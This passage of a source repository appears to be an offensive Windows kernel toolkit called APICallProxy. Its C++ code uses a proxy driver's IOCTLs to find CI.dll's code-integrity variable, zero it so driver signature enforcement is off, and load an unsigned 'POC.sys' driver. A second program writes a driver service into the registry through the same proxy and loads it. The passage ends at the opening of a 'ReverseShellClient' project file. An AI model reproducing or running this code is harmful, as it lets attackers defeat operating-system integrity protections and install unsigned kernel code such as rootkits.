} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;


#define SystemModuleInformation 11
ULONG_PTR  CIModuleBase = 0;
CHAR szModuleName[] = "CI.dll";


LONG QueryCiOptions(_In_ PVOID MappedBase, _Inout_ ULONG_PTR* KernelBase);
ULONG_PTR QueryVariableAddress(VOID);
BOOL LoadDriver(LPCWSTR ServiceName, LPCWSTR DriverPath, DWORD StartType, BOOL DeletePrevioseVersion);


int main(int argc, WCHAR* argv[])
{

	BOOL Status = 1;
	DWORD returned;
	PRTL_PROCESS_MODULES ModuleInfo;
	QuerySystemInformationInfo SystemInformationptr{ 0 };
	AllocateVirtualMeomryInfo Allocate{ 0 };
	ReadWriteVirtualMemoryInfo WriteInfo{ 0 };
	ReadWriteVirtualMemoryInfo ReadInfo{ 0 };

	BYTE DisableValue_g_CiAddress[2] = { 0x00 ,0x00};
	BYTE OriginalValue_g_CiAddress[2] = { 0x00 ,0x00};
	ULONG_PTR   g_CiAddress = 0;


	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}


	//Get the size of structure
	SystemInformationptr.Data = NULL;
	SystemInformationptr.DataSize = 0;
	SystemInformationptr.InformationClass = SystemModuleInformation;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION, &SystemInformationptr, sizeof(QuerySystemInformationInfo), NULL, NULL, &returned, nullptr);

	//allocate memory for module info
	Allocate.BaseAddress = NULL;
	Allocate.RegionSize = SystemInformationptr.DataSize;
	Allocate.ProcessHandle = GetCurrentProcess();
	Allocate.Protect = PAGE_EXECUTE_READWRITE;
	Allocate.AllocationType = MEM_RESERVE | MEM_COMMIT;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, &Allocate, sizeof(AllocateVirtualMeomryInfo), NULL, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Failed to Allocate Memory in Current Process Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Allocated Memory in Current Process at address: 0x%p\n", Allocate.BaseAddress);

	ModuleInfo = (PRTL_PROCESS_MODULES)Allocate.BaseAddress;

	//get loaded driver info
	SystemInformationptr.Data = ModuleInfo;
	SystemInformationptr.InformationClass = SystemModuleInformation;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION, &SystemInformationptr, sizeof(QuerySystemInformationInfo), NULL, NULL, &returned, nullptr);
	if (!Status) {
		//Free memory before exite
		printf("[-] Failed to Get Loaded Drivers Info Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	for (int i = 0; i < ModuleInfo->NumberOfModules; i++) {
		const char* p = strstr((const char*)ModuleInfo->Modules[i].FullPathName, szModuleName);

		if (p) {
			CIModuleBase = (ULONG_PTR)ModuleInfo->Modules[i].ImageBase;
			printf("[+] Found Base address of %s  at %p\n", ModuleInfo->Modules[i].FullPathName, ModuleInfo->Modules[i].ImageBase);
			break;
		}
	}

	if (!CIModuleBase) {
		printf("[-] Failed to Find Base address of CI.dll\n");
		return 0;
	}

	g_CiAddress = QueryVariableAddress();
	if (!g_CiAddress) {
		printf("[-] Failed to Find address of g_CiAddress Global Value\n");
		return 0;
	}

	printf("[+] g_CiAddress address is %p\n", g_CiAddress);


	ReadInfo.ProcessHandle = (HANDLE)GetCurrentProcess();
	ReadInfo.Data = OriginalValue_g_CiAddress;
	ReadInfo.BaseAddress = (PVOID)g_CiAddress;
	ReadInfo.DataLen = 1;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_READ_PROCESS_MEMORY, &ReadInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Faile to Read the Orginal Value of g_CiAddress Error code is: %x\n", Status);
		return 0;
	}

	printf("[+] The Orginal Value of g_CiAddress is: 0x%x\n", OriginalValue_g_CiAddress[0]);

	WriteInfo.ProcessHandle = GetCurrentProcess();
	WriteInfo.Data = DisableValue_g_CiAddress;
	WriteInfo.BaseAddress = (PVOID)g_CiAddress;
	WriteInfo.DataLen = 1;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITE_PROCESS_MEMORY, &WriteInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Failed to write Zero at g_CiAddress to Disable Driver signing policy Error CodeL 0x%x\n", Status);
		return 0;
	}

	printf("[+] Driver signing policy is Disabled\n");


	// load driver here
	if (!LoadDriver(TEXT("POCDriver"), TEXT("c:\\Users\\jony\\Desktop\\POC.sys"), SERVICE_DEMAND_START, TRUE)) {
		printf("[-] Failed to load unsigned Driver\n");
	}
	else {
		printf("[+] Unsigned Driver Loaded Successfully\n");
	}


	//change the value back to original because of PatchGuard
	WriteInfo.ProcessHandle = GetCurrentProcess();
	WriteInfo.Data = (unsigned char*)OriginalValue_g_CiAddress;
	WriteInfo.BaseAddress = (PVOID)g_CiAddress;
	WriteInfo.DataLen = 1;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITE_PROCESS_MEMORY, &WriteInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Failed to Change the g_CiAddress value to its original value, the PatchGuard might catch it depent on windows version and do BSOD \n");
	}
	else {
		printf("[+] Changed the g_CiAddress value to its original value\n");
	}

	return 0;
}

LONG QueryCiOptions(_In_ PVOID MappedBase, _Inout_ ULONG_PTR* KernelBase) {
	PBYTE        CiInitialize = NULL;
	ULONG        c, j = 0;
	LONG         rel = 0;
	hde64s hs;

	CiInitialize = (PBYTE)GetProcAddress((HMODULE)MappedBase, "CiInitialize");
	if (CiInitialize == NULL)
		return 0;


	c = 0;
	j = 0;
	do {

		/* call CipInitialize */
		if (CiInitialize[c] == 0xE8)
			j++;

		if (j > 1) {
			rel = *(PLONG)(CiInitialize + c + 1);
			break;
		}

		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);


	CiInitialize = CiInitialize + c + 5 + rel;
	c = 0;
	do {

		if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
			rel = *(PLONG)(CiInitialize + c + 2);
			break;
		}
		hde64_disasm(CiInitialize + c, (hde64s*)(&hs));
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	CiInitialize = CiInitialize + c + 6 + rel;

	*KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;

	return rel;
}

ULONG_PTR QueryVariableAddress(VOID) {
	LONG rel = 0;
	SIZE_T SizeOfImage = 0;
	ULONG_PTR Result = 0;

	WCHAR* wszErrorEvent, * wszSuccessEvent;
	PVOID MappedBase = NULL;

	CHAR szFullModuleName[MAX_PATH * 2];


	if (CIModuleBase == 0) {
		return 0;
	}

	szFullModuleName[0] = 0;
	if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
		return 0;
	strcat(szFullModuleName, "\\");
	strcat(szFullModuleName, szModuleName);

	MappedBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (MappedBase) {

		rel = QueryCiOptions(
			MappedBase,
			&CIModuleBase);


		if (rel != 0) {
			Result = CIModuleBase;
		}
		FreeLibrary((HMODULE)MappedBase);

	}


	return Result;
}

//Did not implement registry operation yet in the APICallProxy Driver
BOOL LoadDriver(LPCWSTR ServiceName, LPCWSTR DriverPath, DWORD StartType, BOOL DeletePrevioseVersion) {
	SC_HANDLE scm;
	SC_HANDLE scService;
	BOOL result = FALSE;
	TCHAR FilePath[MAX_PATH];

	GetFullPathName(DriverPath, MAX_PATH, FilePath, NULL);
	scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scm)	return FALSE;

	scService = CreateService(scm, ServiceName, ServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, StartType, SERVICE_ERROR_NORMAL, FilePath, NULL, NULL, NULL, NULL, NULL);
	if (!scService) {
		if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_SERVICE_EXISTS) {
			scService = OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
			if (!scService) goto Finish;
			if (DeletePrevioseVersion) {	// recreate
				if (!DeleteService(scService)) goto Finish;
				scService = CreateService(scm, ServiceName, ServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, StartType, SERVICE_ERROR_NORMAL, FilePath, NULL, NULL, NULL, NULL, NULL);
				if (!scService)	goto Finish;
			}
		}
		else goto Finish;
	}
	if (!StartService(scService, 0, NULL)) {
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) result = TRUE;
		else {
			result = FALSE;
			goto Finish;
		}
	}
	result = TRUE;

Finish:
	if (scm) CloseServiceHandle(scm);
	if (scService) CloseServiceHandle(scService);
	return result;
}

```

`APICallProxy/RegisterLoadDriver/RegisterLoadDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{1d21e6d1-5ecc-4ddd-bcb8-9b398d135df5}</ProjectGuid>
    <RootNamespace>RegisterLoadDriver</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>
      </FunctionLevelLinking>
      <IntrinsicFunctions>false</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat>None</DebugInformationFormat>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
      <CompileAs>CompileAsC</CompileAs>
      <SupportJustMyCode>true</SupportJustMyCode>
      <Optimization>Disabled</Optimization>
      <WholeProgramOptimization>false</WholeProgramOptimization>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>
      </EnableCOMDATFolding>
      <OptimizeReferences>
      </OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <RandomizedBaseAddress>false</RandomizedBaseAddress>
      <FixedBaseAddress>true</FixedBaseAddress>
      <DataExecutionPrevention>false</DataExecutionPrevention>
      <LinkTimeCodeGeneration />
      <AdditionalDependencies>Ws2_32.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/RegisterLoadDriver/RegisterLoadDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`APICallProxy/RegisterLoadDriver/main.cpp`:

```cpp
#include <stdio.h>
//#include <Windows.h>

#include <winsock2.h>
#include <Ws2tcpip.h>

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")



#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

typedef enum _KEY_VALUE_INFORMATION_CLASS {
	KeyValueBasicInformation,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	KeyValueLayerInformation,
	MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_FULL_INFORMATION {
	ULONG   TitleIndex;
	ULONG   Type;
	ULONG   DataOffset;
	ULONG   DataLength;
	ULONG   NameLength;
	WCHAR   Name[1];            // Variable size
//          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, * PKEY_VALUE_FULL_INFORMATION;



int main(int argc, WCHAR* argv[])
{

	BOOL Status = 1;
	DWORD returned;
	HANDLE POCKeyHandle = NULL;
	RegistrySetValueInfo SetValueInfo = { 0 };
	OpenCreateRegistryInfo Reginfo = { 0 };
	WCHAR RegPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\POC";

	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	wcscpy(Reginfo.RegistryKeyPath, RegPath);
	Reginfo.DesiredAccess = KEY_ALL_ACCESS;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CREATE_REGISTRY_KEY, &Reginfo, sizeof(OpenCreateRegistryInfo), &POCKeyHandle, sizeof(HANDLE), &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Create POC Registry Service Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Created POC Registry Service Successfully\n");

	DWORD StartValue[] = { SERVICE_DEMAND_START };
	wcscpy(SetValueInfo.KeyName, L"Start");
	SetValueInfo.Date = StartValue;
	SetValueInfo.DateSize = 4; //DWORD Size
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_DWORD;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set Start Value to SERVICE_DEMAND_START Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting Start Value to SERVICE_DEMAND_START Successfully\n");

	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
	DWORD TypeValue[] = { SERVICE_KERNEL_DRIVER };
	wcscpy(SetValueInfo.KeyName, L"Type");
	SetValueInfo.Date = TypeValue;
	SetValueInfo.DateSize = 4;	//DWORD Size
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_DWORD;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set Type Value to SERVICE_KERNEL_DRIVER Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting Type Value to SERVICE_KERNEL_DRIVER Successfully\n");

	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
	DWORD ErrorControlValue[] = { SERVICE_ERROR_NORMAL };
	wcscpy(SetValueInfo.KeyName, L"ErrorControl");
	SetValueInfo.Date = ErrorControlValue;
	SetValueInfo.DateSize = 4;	//DWORD Size
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_DWORD;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set ErrorControl Value to SERVICE_ERROR_NORMAL Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting ErrorControl Value to SERVICE_ERROR_NORMAL Successfully\n");


	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
	WCHAR BinPath[] = L"POC.sys";	//Change to image Full Path (\??\\c:\\Users\\UserName\\Desktop\\POC.sys)
	wcscpy(SetValueInfo.KeyName, L"ImagePath");
	SetValueInfo.Date = BinPath;
	SetValueInfo.DateSize = wcslen(BinPath) * 2 + 2;
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_SZ;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set ImagePath Value Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting ImagePath Value Successfully\n");


	// Get Needed Memory Size
	RegistryQueryKeyValueInfo QueryKeyValueInfo = { 0 };
	QueryKeyValueInfo.KeyHandle = POCKeyHandle;
	wcscpy(QueryKeyValueInfo.ValueName, L"ImagePath");
	QueryKeyValueInfo.KeyValueInformationClass = KeyValueFullInformation;
	QueryKeyValueInfo.Data = NULL;
	QueryKeyValueInfo.DateSize = 0;
	ULONG ReturnSize = 0;
	QueryKeyValueInfo.ResultLength = &ReturnSize;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_QUERY_KEY_VALUE, &QueryKeyValueInfo, sizeof(RegistryQueryKeyValueInfo), NULL, NULL, &returned, FALSE);

	//Allocate memory for ImagePath
	AllocateVirtualMeomryInfo Allocate = { 0 };
	Allocate.BaseAddress = NULL;
	Allocate.RegionSize = ReturnSize;
	Allocate.ProcessHandle = GetCurrentProcess();
	Allocate.Protect = PAGE_EXECUTE_READWRITE;
	Allocate.AllocationType = MEM_RESERVE | MEM_COMMIT;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, &Allocate, sizeof(AllocateVirtualMeomryInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Allocate Memory in Current Process Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Allocated Memory Successfully\n");

	//Query the ImagePath Key Value
	QueryKeyValueInfo.Data = Allocate.BaseAddress;
	QueryKeyValueInfo.DateSize = ReturnSize;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_QUERY_KEY_VALUE, &QueryKeyValueInfo, sizeof(RegistryQueryKeyValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Query Key Value for ImagePath Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Query Key Value Successfully\n");

	PKEY_VALUE_FULL_INFORMATION keyInfo = (PKEY_VALUE_FULL_INFORMATION)Allocate.BaseAddress;

	if (keyInfo->Type != REG_SZ) {
		printf("[-] Error: The ImagePath should be REG_SZ Key\n");
	}
	else {
		printf("[+] The ImagePath Path value is %S\n", ((UCHAR*)Allocate.BaseAddress + keyInfo->DataOffset));
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_LOAD_DRIVER, RegPath, wcslen(RegPath) * 2 + 2, NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Load Driver Error Code: 0x%x\n", GetLastError());
	}
	else {
		printf("[+] Driver Loaded Successfully\n");
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &POCKeyHandle, sizeof(HANDLE), FALSE, 0, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Close Handle to Registry Key Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Closed Handle to Registry Key Successfully\n");


	return 0;
}
```

`APICallProxy/ReverseShellClient/ReverseShellClient.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{8d49460f-1b25-40e0-89cb-6778b18c969c}</ProjectGuid>
    <RootNamespace>ReverseShellClient</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
